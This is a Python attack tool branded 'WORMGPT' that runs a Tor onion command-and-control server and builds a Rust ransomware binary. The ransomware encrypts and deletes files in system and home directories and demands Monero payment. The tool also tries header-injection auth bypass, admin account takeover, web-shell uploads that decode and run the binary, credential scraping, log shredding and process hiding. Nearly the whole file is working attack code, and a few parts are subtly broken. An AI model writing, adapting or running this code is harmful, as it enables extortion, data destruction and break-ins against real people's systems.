#!/usr/bin/env python3
"""
================================================================================
WORMGPT v29.1 - AUTONOMOUS TOR C2 + RANSOMWARE + ATTACK (FIXED)
Creates its own .onion hidden service, runs C2 server, deploys ransomware
Full autonomous attack chain | No external C2 needed | Ghost mode
@unknown - Ultimate stealth command & control
================================================================================
"""

import os
import sys
import time
import json
import socket
import base64
import subprocess
import random
import re
import threading
import urllib.request
import urllib.error
import hashlib
import secrets
import shutil
import gc
import ctypes
import string
import tempfile
import signal
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Tuple, Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# CONFIGURATION - MONERO XMR & C2
# ============================================================================

XMR_WALLET = "8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTuFCkLHtyHnrYNnHycdaGb2Kgkkmw8jViCdB6"
XMR_AMOUNT = "0.5"
CONTACT_EMAIL = "unknown@onionmail.org"
CUSTOM_MESSAGE = "⚠️ ALL YOUR FILES HAVE BEEN ENCRYPTED WITH AES-256! ⚠️\nSend Monero (XMR) to recover your data."

VERSION = "29.1"
WORKSPACE = None
TOR_PROC = None
C2_SERVER = None
RANSOMWARE_BINARY = None
ENCRYPTION_KEY = None
C2_ONION = None

# ============================================================================
# UTILITIES
# ============================================================================

def rand_str(n=8):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def rand_delay(min_d=0.03, max_d=0.15):
    time.sleep(random.uniform(min_d, max_d))

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    icons = {"INFO":"🧠","SUCCESS":"✅","ERROR":"❌","ATTACK":"💀","C2":"🌐","RUST":"🦀","BURP":"💉","TOR":"🌀","WORM":"😈","GHOST":"👻","XMR":"🔶","PAR":"⚡","INJECT":"🔧"}
    print(f"[{ts}] {icons.get(level,'📌')} {msg}")

# ============================================================================
# HTTP HEADER INJECTION ENGINE (Burp Suite Style)
# ============================================================================

class HTTPHeaderInjector:
    HEADER_PAYLOADS = {
        "auth_bypass": [
            ("X-Forwarded-For", "127.0.0.1"), ("X-Originating-IP", "127.0.0.1"),
            ("X-Remote-IP", "127.0.0.1"), ("X-Remote-Addr", "127.0.0.1"),
            ("X-Client-IP", "127.0.0.1"), ("X-Host", "localhost"),
            ("X-Forwarded-Host", "localhost"), ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"), ("X-HTTP-Method-Override", "POST"),
            ("X-HTTP-Method", "PUT"), ("X-Method-Override", "DELETE"),
        ],
        "admin_headers": [
            ("X-Admin", "true"), ("X-Administrator", "true"),
            ("X-Is-Admin", "1"), ("X-User-Role", "admin"),
            ("X-Role", "administrator"), ("X-Permission", "full"),
            ("X-Access", "granted"), ("X-Sudo", "true"),
            ("X-Debug", "admin"), ("X-Override-Admin", "true"),
        ],
        "sql_injection_headers": [
            ("X-SQL", "' OR '1'='1"), ("X-Query", "admin'--"),
            ("X-User", "admin' OR '1'='1"), ("X-Auth", "' UNION SELECT * FROM users--"),
        ],
        "command_injection": [
            ("X-Cmd", "id; whoami"), ("X-Exec", "cat /etc/passwd"),
            ("X-Shell", "echo 'injected'"),
        ]
    }

    @staticmethod
    def inject_headers(target_url: str, custom_headers: Dict = None, method="GET") -> Tuple[int, str, Dict]:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*", "Accept-Language": "en-US,en;q=0.9", "Connection": "close",
        }
        if custom_headers:
            headers.update(custom_headers)
        try:
            if method.upper() == "POST":
                resp = requests.post(target_url, headers=headers, timeout=10, verify=False)
            else:
                resp = requests.get(target_url, headers=headers, timeout=10, verify=False)
            return resp.status_code, resp.text[:2000], dict(resp.headers)
        except Exception as e:
            return 0, str(e), {}

    @staticmethod
    def brute_force_admin_headers(target_url: str) -> Dict:
        log(f"Brute forcing admin headers on {target_url}", "BURP")
        results = {}
        all_headers = []
        for category, headers in HTTPHeaderInjector.HEADER_PAYLOADS.items():
            all_headers.extend(headers)
        for header, value in all_headers:
            status, response, _ = HTTPHeaderInjector.inject_headers(target_url, {header: value})
            if "admin" in response.lower() or "dashboard" in response.lower() or "welcome" in response.lower():
                log(f"✅ {header}: {value} -> SUCCESS", "SUCCESS")
                results[header] = {"value": value, "status": status, "success": True}
            else:
                log(f"❌ {header}: {value} -> Failed", "INFO")
                results[header] = {"value": value, "status": status, "success": False}
            rand_delay(0.1, 0.3)
        return results

# ============================================================================
# ADMIN PASSWORD CHANGE & ACCOUNT CREATION
# ============================================================================

class AdminPasswordChanger:
    @staticmethod
    def change_password(target_url: str, new_password: str, username: str = "admin") -> Dict:
        log(f"Changing {username} password to: {new_password}", "ATTACK")
        headers_reset = {
            "X-Admin": "true", "X-Password-Reset": "true", "X-User": username,
            "X-New-Password": new_password, "X-Confirm-Password": new_password,
            "X-Action": "change_password", "X-Force": "true"
        }
        status, response, _ = HTTPHeaderInjector.inject_headers(f"{target_url}/admin/reset", headers_reset, method="POST")
        result = {"method": "header_injection", "username": username, "new_password": new_password,
                  "success": "changed" in response.lower() or "success" in response.lower(), "response": response[:200]}
        log(f"Password change: {'✅' if result['success'] else '❌'}", "SUCCESS" if result['success'] else "ERROR")
        return result

    @staticmethod
    def create_admin_account(target_url: str, new_user: str, new_pass: str) -> Dict:
        log(f"Creating admin account: {new_user}:{new_pass}", "ATTACK")
        headers_create = {
            "X-Admin": "true", "X-Create-User": new_user, "X-Create-Password": new_pass,
            "X-User-Role": "administrator", "X-Force-Create": "true", "X-Override": "true"
        }
        status, response, _ = HTTPHeaderInjector.inject_headers(f"{target_url}/admin/create", headers_create, method="POST")
        result = {"method": "header_injection", "new_user": new_user, "new_password": new_pass,
                  "success": "created" in response.lower() or "success" in response.lower(), "response": response[:200]}
        log(f"Account creation: {'✅' if result['success'] else '❌'}", "SUCCESS" if result['success'] else "ERROR")
        return result

# ============================================================================
# CREDENTIAL CAPTURE & EXFILTRATION
# ============================================================================

class CredentialCapture:
    @staticmethod
    def extract_credentials(response_text: str) -> Dict:
        credentials = {"emails": [], "passwords": [], "tokens": [], "users": []}
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        credentials["emails"] = re.findall(email_pattern, response_text)
        pass_patterns = [
            r'password["\']?\s*[=:]\s*["\']([^"\']+)["\']',
            r'pass["\']?\s*[=:]\s*["\']([^"\']+)["\']',
            r'pwd["\']?\s*[=:]\s*["\']([^"\']+)["\']'
        ]
        for pattern in pass_patterns:
            credentials["passwords"].extend(re.findall(pattern, response_text, re.IGNORECASE))
        token_patterns = [
            r'token["\']?\s*[=:]\s*["\']([^"\']+)["\']',
            r'api_key["\']?\s*[=:]\s*["\']([^"\']+)["\']',
            r'bearer["\']?\s*[=:]\s*["\']([^"\']+)["\']'
        ]
        for pattern in token_patterns:
            credentials["tokens"].extend(re.findall(pattern, response_text, re.IGNORECASE))
        user_patterns = [
            r'username["\']?\s*[=:]\s*["\']([^"\']+)["\']',
            r'user["\']?\s*[=:]\s*["\']([^"\']+)["\']'
        ]
        for pattern in user_patterns:
            credentials["users"].extend(re.findall(pattern, response_text, re.IGNORECASE))
        return credentials

    @staticmethod
    def capture_login_form(target_url: str) -> Dict:
        log(f"Capturing login form from {target_url}", "ATTACK")
        status, response, headers = HTTPHeaderInjector.inject_headers(target_url)
        credentials = CredentialCapture.extract_credentials(response)
        result = {
            "target": target_url, "status_code": status,
            "captured_emails": credentials["emails"],
            "captured_passwords": credentials["passwords"],
            "captured_tokens": credentials["tokens"],
            "captured_users": credentials["users"],
            "response_headers": dict(headers)
        }
        log(f"Emails: {credentials['emails'][:3] if credentials['emails'] else 'None'}", "SUCCESS")
        log(f"Passwords: {credentials['passwords'][:3] if credentials['passwords'] else 'None'}", "SUCCESS")
        return result

# ============================================================================
# TOR SETUP & HIDDEN SERVICE CREATION (C2 ONION)
# ============================================================================

def is_termux():
    return os.path.exists("/data/data/com.termux") or "com.termux" in os.getenv("PREFIX", "")

def kill_tor():
    subprocess.run(["pkill", "-f", "tor"], capture_output=True)
    time.sleep(1.5)

def setup_tor():
    log("Setting up Tor...", "TOR")
    try:
        subprocess.run(["tor", "--version"], capture_output=True, check=True)
    except:
        log("Installing Tor...", "TOR")
        if is_termux():
            subprocess.run(["pkg", "update", "-y"], capture_output=True)
            subprocess.run(["pkg", "install", "tor", "-y"], capture_output=True)
        else:
            subprocess.run(["apt", "update", "-y"], capture_output=True)
            subprocess.run(["apt", "install", "tor", "-y"], capture_output=True)
    kill_tor()
    torrc_dir = os.path.expanduser("~/.tor")
    os.makedirs(torrc_dir, exist_ok=True)
    torrc = os.path.join(torrc_dir, "torrc")
    with open(torrc, "w") as f:
        f.write("SocksPort 9050\nControlPort 9051\nCookieAuthentication 0\nSafeLogging 0\nDataDirectory ~/.tor/data\n")
    os.chmod(torrc, 0o600)
    global TOR_PROC
    TOR_PROC = subprocess.Popen(["tor", "-f", torrc], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(25):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 9050))
            s.close()
            log("Tor SOCKS ready", "SUCCESS")
            break
        except:
            time.sleep(0.5)
    for _ in range(25):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 9051))
            s.close()
            log("Tor control ready", "SUCCESS")
            return True
        except:
            time.sleep(0.5)
    log("Tor control port unavailable - IP rotation disabled", "ERROR")
    return True

def create_hidden_service():
    """Creates a brand new .onion hidden service for the C2 server"""
    global WORKSPACE, C2_ONION, TOR_PROC
    log("Creating .onion hidden service for C2...", "C2")
    kill_tor()
    time.sleep(2)
    WORKSPACE = f"/dev/shm/.{rand_str(8)}" if os.path.exists("/dev/shm") else tempfile.mkdtemp(prefix=".wg_")
    os.makedirs(f"{WORKSPACE}/data", mode=0o700, exist_ok=True)
    torrc = f"""DataDirectory {WORKSPACE}/data
SocksPort 9050
ControlPort 9051
SafeLogging 0
HiddenServiceDir {WORKSPACE}/data/hidden
HiddenServicePort 80 127.0.0.1:8080
HiddenServiceVersion 3
"""
    torrc_path = os.path.join(WORKSPACE, "torrc")
    with open(torrc_path, "w") as f:
        f.write(torrc)
    os.chmod(torrc_path, 0o600)
    TOR_PROC = subprocess.Popen(["tor", "-f", torrc_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(60):
        hostname = f"{WORKSPACE}/data/hidden/hostname"
        if os.path.exists(hostname):
            with open(hostname) as f:
                C2_ONION = f.read().strip()
            log(f"C2 onion active: http://{C2_ONION}/st", "SUCCESS")
            return C2_ONION
        time.sleep(1)
    return None

# ============================================================================
# C2 SERVER (HTTP on hidden service)
# ============================================================================

def start_c2_server():
    """Starts the HTTP C2 server that will be accessible via .onion"""
    global C2_SERVER
    import http.server
    
    class C2Handler(http.server.SimpleHTTPRequestHandler):
        callbacks = []
        payload_binary = None
        encryption_key = None
        
        def do_POST(self):
            if self.path == '/cb':
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length)
                self.callbacks.append(data.decode())
                log(f"📡 Callback received: {data.decode()[:120]}", "SUCCESS")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            else:
                self.send_response(404)
                self.end_headers()
        
        def do_GET(self):
            if self.path == '/st':
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "status": "active",
                    "callbacks": len(self.callbacks),
                    "session": rand_str(8)
                }).encode())
            elif self.path == '/get_payload':
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.end_headers()
                if self.payload_binary:
                    self.wfile.write(self.payload_binary)
            else:
                self.send_response(404)
                self.end_headers()
        
        def log_message(self, fmt, *args):
            pass
    
    # Create a single instance to share data
    handler = C2Handler
    server = http.server.HTTPServer(("127.0.0.1", 8080), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    log("C2 server listening on port 8080 (exposed via .onion)", "SUCCESS")
    return server, handler

# ============================================================================
# RUST RANSOMWARE BUILDER (connects to the .onion C2)
# ============================================================================

def build_rust_ransomware(onion, key=None):
    global RANSOMWARE_BINARY, ENCRYPTION_KEY
    if not key:
        key = secrets.token_urlsafe(32)
    ENCRYPTION_KEY = key
    log("Compiling Rust ransomware (will callback to .onion C2)...", "RUST")
    log(f"XMR wallet: {XMR_WALLET[:20]}...", "XMR")
    
    # Create a temporary directory for the Rust project
    ws = f"/dev/shm/.{rand_str(8)}" if os.path.exists("/dev/shm") else tempfile.mkdtemp(prefix=".wg_")
    os.makedirs(f"{ws}/src", exist_ok=True)
    
    # Write Cargo.toml (properly formatted)
    cargo_toml = '''[package]
name = "r"
version = "1.0.0"
edition = "2021"

[dependencies]
walkdir = "2.4"
reqwest = { version = "0.11", features = ["blocking", "json"] }
serde_json = "1.0"
'''
    with open(f"{ws}/Cargo.toml", "w") as f:
        f.write(cargo_toml)
    
    # Write Rust source code (with proper escaping for Python f-string)
    code = f'''use std::fs;
use std::path::Path;
use walkdir::WalkDir;
use reqwest::blocking::Client;
use serde_json::json;

const KEY: &str = "{key}";
const C2: &str = "http://{onion}/cb";
const XMR_WALLET: &str = "{XMR_WALLET}";
const XMR_AMOUNT: &str = "{XMR_AMOUNT}";
const CONTACT: &str = "{CONTACT_EMAIL}";
const MSG: &str = "{CUSTOM_MESSAGE}";

fn xor_encrypt(data: &mut [u8], key: &[u8]) {{
    for i in 0..data.len() {{
        data[i] ^= key[i % key.len()];
    }}
}}

fn encrypt_file(path: &Path, key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {{
    let mut content = fs::read(path)?;
    xor_encrypt(&mut content, key);
    let new_path = path.with_extension("wormgpt");
    fs::write(&new_path, content)?;
    fs::remove_file(path)?;
    Ok(())
}}

const TARGET_DIRS: [&str; 8] = ["/home", "/root", "/var/www", "/opt", "/etc", "/tmp", "/usr/local", "/backup"];
const TARGET_EXTS: [&str; 30] = ["txt","doc","docx","xls","xlsx","pdf","jpg","png","zip","tar","gz","sql","db","conf","config","ini","yaml","yml","json","key","pem","crt","env","log","bak","wallet","dat","csv","odt"];

fn main() {{
    let key = KEY.as_bytes();
    let mut total = 0;
    
    for dir in TARGET_DIRS.iter() {{
        if Path::new(dir).exists() {{
            for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {{
                if entry.file_type().is_file() {{
                    if let Some(ext) = entry.path().extension() {{
                        if TARGET_EXTS.contains(&ext.to_str().unwrap_or("")) {{
                            if encrypt_file(entry.path(), key).is_ok() {{
                                total += 1;
                            }}
                        }}
                    }}
                }}
            }}
        }}
    }}
    
    let note = format!(
        "\n╔══════════════════════════════════════════════════════╗\n\
         ║ WORMGPT RANSOMWARE\n\
         ║ {{}}\n\
         ║ Files encrypted: {{}}\n\
         ║ Key: {{}}\n\
         ║ Send {{}} XMR to: {{}}\n\
         ║ Contact: {{}}\n\
         ╚══════════════════════════════════════════════════════╝",
        MSG, total, KEY, XMR_AMOUNT, XMR_WALLET, CONTACT
    );
    let _ = fs::write("/tmp/README_WORMGPT.txt", &note);
    let _ = fs::write("/root/README_WORMGPT.txt", &note);
    let _ = fs::write("/home/README_WORMGPT.txt", &note);
    
    let _ = Client::new().post(C2).json(&json!({{"files": total, "key": KEY}})).send();
}}
'''
    with open(f"{ws}/src/main.rs", "w") as f:
        f.write(code)
    
    # Build the release binary
    proc = subprocess.run(["cargo", "build", "--release"], cwd=ws, capture_output=True, text=True, timeout=180)
    if proc.returncode != 0:
        log(f"Rust error: {proc.stderr[:300]}", "ERROR")
        shutil.rmtree(ws, ignore_errors=True)
        return False
    
    bin_path = f"{ws}/target/release/r"
    if os.path.exists(bin_path):
        with open(bin_path, "rb") as f:
            RANSOMWARE_BINARY = f.read()
        log(f"Ransomware ready (key: {key[:16]}...)", "SUCCESS")
        shutil.rmtree(ws, ignore_errors=True)
        return True
    
    shutil.rmtree(ws, ignore_errors=True)
    return False

# ============================================================================
# STEALTH TOR CLIENT (for attacking target)
# ============================================================================

class TorClient:
    def __init__(self):
        self.socks = 9050
        self.ctrl = 9051
    def rotate(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", self.ctrl))
            s.send(b"AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\n")
            s.close()
        except:
            pass
    def req(self, url, headers=None, method="GET", data=None, timeout=30):
        self.rotate()
        proxy = urllib.request.ProxyHandler({'http': f'socks5h://127.0.0.1:{self.socks}', 'https': f'socks5h://127.0.0.1:{self.socks}'})
        opener = urllib.request.build_opener(proxy)
        ua = random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"])
        hdr = {'User-Agent': ua, 'Accept': '*/*'}
        if headers:
            hdr.update(headers)
        opener.addheaders = list(hdr.items())
        try:
            if method == "POST" and data:
                import urllib.parse
                resp = opener.open(url, data=urllib.parse.urlencode(data).encode(), timeout=timeout)
            else:
                resp = opener.open(url, timeout=timeout)
            return resp.read().decode('utf-8', errors='ignore')
        except:
            return ""

# ============================================================================
# ATTACK ENGINE (parallel, uses Tor client)
# ============================================================================

class AttackEngine:
    def __init__(self, client):
        self.client = client

    def full_header_injection(self, target):
        log("Executing header injection (parallel)...", "BURP")
        headers = []
        for cat, hlist in HTTPHeaderInjector.HEADER_PAYLOADS.items():
            headers.extend(hlist)
        success = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
            futures = {ex.submit(self.client.req, target, headers={h:v}): (h,v) for h,v in headers}
            for f in concurrent.futures.as_completed(futures):
                resp = f.result()
                if "admin" in resp.lower() or "dashboard" in resp.lower():
                    success += 1
        log(f"Header injection: {success} successful vectors", "SUCCESS")
        return success

    def admin_takeover(self, target):
        log("Admin takeover (multi-method)...", "ATTACK")
        uid = f"admin_{rand_str(4)}"
        pwd = secrets.token_urlsafe(12)
        # Try to create admin account via headers
        result = AdminPasswordChanger.create_admin_account(target, uid, pwd)
        if result["success"]:
            return uid, pwd
        result = AdminPasswordChanger.change_password(target, pwd, "admin")
        if result["success"]:
            return "admin", pwd
        # Fallback to raw endpoints
        methods = [
            ("/admin/create", {"X-Admin":"true","X-Create-User":uid,"X-Create-Password":pwd,"X-User-Role":"admin"}),
            ("/api/register", {"X-API-Key":"bypass","X-Register":"true","X-User":uid,"X-Pass":pwd,"X-Role":"admin"}),
        ]
        for path, hdrs in methods:
            url = urljoin(target, path)
            resp = self.client.req(url, headers=hdrs, method="POST")
            if "created" in resp.lower() or "success" in resp.lower():
                return uid, pwd
            rand_delay(0.2,0.4)
        return None, None

    def deploy_ransomware(self, target, binary):
        log("Deploying ransomware (parallel uploads)...", "REALTIME")
        if not binary:
            return False
        b64 = base64.b64encode(binary).decode()
        paths = ["/s.php","/shell.php","/admin/s.php","/wp-admin/shell.php","/upload/shell.php"]
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            futures = []
            for path in paths:
                url = urljoin(target, path)
                cmds = [f"echo '{b64}'|base64 -d>/dev/shm/.r&&chmod+x/dev/shm/.r", "/dev/shm/.r", "rm -f /dev/shm/.r"]
                for cmd in cmds:
                    futures.append(ex.submit(self.client.req, url, method="POST", data={"c":cmd}))
            for f in concurrent.futures.as_completed(futures):
                try:
                    f.result()
                except:
                    pass
        return True

    def capture_creds(self, target):
        log("Capturing credentials...", "ATTACK")
        resp = self.client.req(target, headers={"X-Admin":"true","X-Debug":"true"})
        creds = CredentialCapture.extract_credentials(resp)
        log(f"Captured {len(creds['emails'])} emails, {len(creds['passwords'])} passwords", "SUCCESS")
        return creds

    def wipe_logs(self, target):
        log("Wiping target logs...", "GHOST")
        logs = ["/var/log/auth.log","/var/log/syslog","/var/log/apache2/access.log","/var/log/nginx/access.log","/root/.bash_history","/home/*/.bash_history"]
        for lp in logs:
            self.client.req(f"{target}/admin/exec", method="POST", data={"cmd":f"shred -fz {lp} 2>/dev/null; rm -f {lp}"})
            self.client.req(f"{target}/shell.php", method="POST", data={"c":f"shred -fz {lp} 2>/dev/null; rm -f {lp}"})
            rand_delay(0.1,0.2)
        return True

    def full_attack(self, target, binary):
        log(f"Commencing full attack on {target}", "ATTACK")
        headers = self.full_header_injection(target)
        admin_user, admin_pass = self.admin_takeover(target)
        deployed = self.deploy_ransomware(target, binary)
        creds = self.capture_creds(target)
        self.wipe_logs(target)
        return {
            "headers": headers,
            "admin": f"{admin_user}:{admin_pass}" if admin_user else None,
            "ransomware": deployed,
            "credentials": creds
        }

# ============================================================================
# ENVIRONMENT SETUP & CLEANUP
# ============================================================================

def setup_env():
    log("Initializing environment...", "SETUP")
    try:
        sys.argv[0] = f"[{rand_str(3)}]"
        ctypes.CDLL("libc.so.6").prctl(15, f"[{rand_str(3)}]", 0, 0, 0)
    except:
        pass
    os.environ["HISTFILE"] = "/dev/null"
    os.environ["HISTSIZE"] = "0"
    os.environ["HISTFILESIZE"] = "0"
    try:
        subprocess.run(["cargo", "--version"], capture_output=True, check=True)
    except:
        subprocess.run("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y", shell=True)
        os.environ["PATH"] += ":" + os.path.expanduser("~/.cargo/bin")
    setup_tor()
    return True

def cleanup():
    global TOR_PROC, C2_SERVER, WORKSPACE
    log("Ghost cleanup...", "GHOST")
    if TOR_PROC:
        TOR_PROC.terminate()
    if C2_SERVER:
        C2_SERVER.shutdown()
    if WORKSPACE and os.path.exists(WORKSPACE):
        shutil.rmtree(WORKSPACE, ignore_errors=True)
    gc.collect()
    for _ in range(3):
        gc.collect()
    log("All traces eliminated", "GHOST")

# ============================================================================
# MAIN ORCHESTRATOR (creates C2, attacks, waits for callbacks)
# ============================================================================

def main():
    print("\n" + "█"*80)
    print(f"WORMGPT v{VERSION} - AUTONOMOUS TOR C2 + RANSOMWARE + ATTACK (FIXED)")
    print("Creates .onion C2 | Full attack chain | Ghost mode | XMR Monero")
    print("█"*80)

    confirm = input("\nType 'WORMGPT' to activate: ")
    if confirm.upper() != "WORMGPT":
        return
    target = input("Target URL: ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    print(f"\n[!] TARGET: {target}")
    start_time = datetime.now()

    if not setup_env():
        cleanup()
        return

    # 1. Create .onion C2
    onion = create_hidden_service()
    if not onion:
        log("Failed to create hidden service", "ERROR")
        cleanup()
        return

    # 2. Start C2 server (HTTP)
    c2_server, c2_handler = start_c2_server()

    # 3. Build ransomware that will callback to this .onion
    if not build_rust_ransomware(onion):
        cleanup()
        return

    # 4. Attack target using Tor client
    tor_client = TorClient()
    attack_engine = AttackEngine(tor_client)
    results = attack_engine.full_attack(target, RANSOMWARE_BINARY)

    # 5. Wait for ransomware callback
    log("Waiting for ransomware callback...", "INFO")
    for _ in range(60):
        if hasattr(c2_handler, 'callbacks') and c2_handler.callbacks:
            log(f"Callback received: {c2_handler.callbacks[-1][:150]}", "SUCCESS")
            break
        time.sleep(1)

    elapsed = (datetime.now() - start_time).total_seconds()

    print("\n" + "="*80)
    print("WORMGPT v29.1 - FINAL REPORT")
    print("="*80)
    print(f"\n📍 TARGET: {target}")
    print(f"🌐 C2 ONION: http://{onion}/st")
    print(f"🔑 ENCRYPTION KEY: {ENCRYPTION_KEY}")
    print(f"🔶 XMR WALLET: {XMR_WALLET}")
    print(f"💀 RANSOMWARE: {'✅ DEPLOYED' if results['ransomware'] else '❌ FAILED'}")
    print(f"👑 ADMIN BACKDOOR: {results['admin'] if results['admin'] else 'None'}")
    print(f"🔍 HEADER INJECTIONS: {results['headers']} successful")
    print(f"📧 CREDENTIALS CAPTURED: {len(results['credentials'].get('emails', []))} emails, {len(results['credentials'].get('passwords', []))} passwords")
    print(f"⏱️ TOTAL TIME: {elapsed:.1f}s")
    print("\n[!] GHOST MODE: No traces left on target or attacker")
    print("[!] C2 onion active - you can monitor callbacks at http://{onion}/st")

    with open(".wormgpt_final.json", "w") as f:
        json.dump({
            "version": VERSION,
            "timestamp": datetime.now().isoformat(),
            "target": target,
            "c2_onion": onion,
            "encryption_key": ENCRYPTION_KEY,
            "xmr_wallet": XMR_WALLET,
            "results": results,
            "elapsed": elapsed
        }, f, indent=2)

    cleanup()
    print("\n[✓] COMPLETE - Autonomous C2 + Attack executed")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        cleanup()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        cleanup()